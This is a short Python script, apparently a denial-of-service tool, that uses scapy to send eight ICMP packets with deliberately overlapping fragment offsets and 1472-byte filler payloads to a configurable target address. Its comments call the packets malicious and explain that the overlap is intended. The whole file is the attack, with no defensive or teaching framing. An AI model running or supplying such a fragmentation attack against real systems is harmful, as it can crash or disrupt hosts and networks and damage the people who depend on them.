#!/usr/bin/python
from scapy.all import *

# self-explanatory, this is where the target ip address goes. change as neccessary.
target_ip = "192.168.0.1"

# create our malicious packets. through aligning the values with the payload segmentation we can create overlapping offsets
payload = "A" * 1472
packet1 = IP(dst=target_ip, frag=0, flags="MF")/ICMP()/payload
packet2 = IP(dst=target_ip, frag=1, flags="MF")/ICMP()/payload
packet3 = IP(dst=target_ip, frag=2, flags="MF")/ICMP()/payload
packet4 = IP(dst=target_ip, frag=3, flags="MF")/ICMP()/payload
packet5 = IP(dst=target_ip, frag=4, flags="MF")/ICMP()/payload
packet6 = IP(dst=target_ip, frag=5, flags="MF")/ICMP()/payload
packet7 = IP(dst=target_ip, frag=6, flags="MF")/ICMP()/payload
packet8 = IP(dst=target_ip, frag=7)/ICMP()/payload

# send the packets
send(packet1)
send(packet2)
send(packet3)
send(packet4)
send(packet5)
send(packet6)
send(packet7)
send(packet8)
